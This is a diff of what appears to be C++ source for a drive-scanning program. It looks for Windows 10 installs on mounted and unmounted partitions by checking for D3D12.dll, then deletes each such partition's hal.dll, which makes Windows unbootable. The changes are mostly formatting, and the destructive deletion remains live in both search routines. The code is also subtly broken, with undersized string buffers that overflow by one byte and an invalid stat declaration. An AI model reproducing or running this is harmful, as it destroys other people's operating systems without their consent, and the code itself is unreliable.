@@ -26,6 +26,8 @@ enum WinVer { Win10, Win8_1, Win8, Win7, WinVista, WinXP64, WinXP32, Win2000, Ot
 
 OS_Lang language;
 
+// TODO: print(stdout) scan(buf, 32)
+
 WinVer WindowsVersion() {
 #ifdef _WIN32
   FILE* script = fopen("version.cmd", "w");
@@ -135,10 +137,8 @@ void MountedSearch() {
   FILE* drive_list = fopen("drive_list", "r");
   assert(drive_list != nullptr);
 
-  char drive[16];  // /dev/sda1
-  char source[32]; // /c
-  //char name[256];   // /c/Windows/System32/D3D12.dll
-  //char del[256];    // /c/Windows/System32/hal.dll
+  char drive[16];
+  char source[32];
 
   while (fscanf(drive_list, "%s %s\n", drive, source) == 2) {
     printf("Drive %s mounted in: %s\n", drive, source);
@@ -147,7 +147,7 @@ void MountedSearch() {
     strcpy(name, source);
     strcat(name, "/Windows/System32/D3D12.dll");
     printf("Looking for file: %s\n", name);
-	assert(strlen(name) == strlen(source) + 28);///////////////
+    assert(strlen(name) == strlen(source) + 28);//////////////////
 
     stat buffer; // struct???
     if (stat(name, &buffer) == 0) {
@@ -156,7 +156,7 @@ void MountedSearch() {
       strcpy(del, source);
       strcat(del, "/Windows/System32/hal.dll");
       printf("Deleting %s ...\n", del);
-	  assert(strlen(del) == strlen(source) + 26);//////////////////
+      assert(strlen(del) == strlen(source) + 26);//////////////////
       remove(del);
     }
     printf("\n");
@@ -175,9 +175,6 @@ void UnmountedSearch() {
   assert(drive_list != nullptr);
 
   char drive[16];
-  char source[32];
-  //char name[256];
-  //char del[256];
 
   while (fscanf(drive_list, "%s\n", drive) == 1) {
     printf("Unmounted drive found in: %s\n", drive);
@@ -192,6 +189,7 @@ void UnmountedSearch() {
 
     FILE* media = fopen("media", "r");
     assert(media != nullptr);
+    char source[32];
     int mounted = fscanf(media, "Mounted %s at %s", drive, source);
     fclose(media);
     remove("media");
@@ -208,16 +206,16 @@ void UnmountedSearch() {
     strcpy(name, source);
     strcat(name, "/Windows/System32/D3D12.dll");
     printf("Looking for file: %s\n", name);
-	assert(strlen(name) == strlen(source) + 28);///////////////
+    assert(strlen(name) == strlen(source) + 28);//////////////////
 
     stat buffer;
     if (stat(name, &buffer) == 0) {
       printf(RED "ERROR: Windows 10 detected in partition:" NORMAL " %s\n", drive);
-	  char* del = new char[strlen(source) + 26];
+      char* del = new char[strlen(source) + 26];
       strcpy(del, source);
       strcat(del, "/Windows/System32/hal.dll");
       printf("Deleting %s ...\n", del);
-	  assert(strlen(del) == strlen(source) + 26);//////////////////
+      assert(strlen(del) == strlen(source) + 26);//////////////////
       remove(del);
     }
     printf("\n");
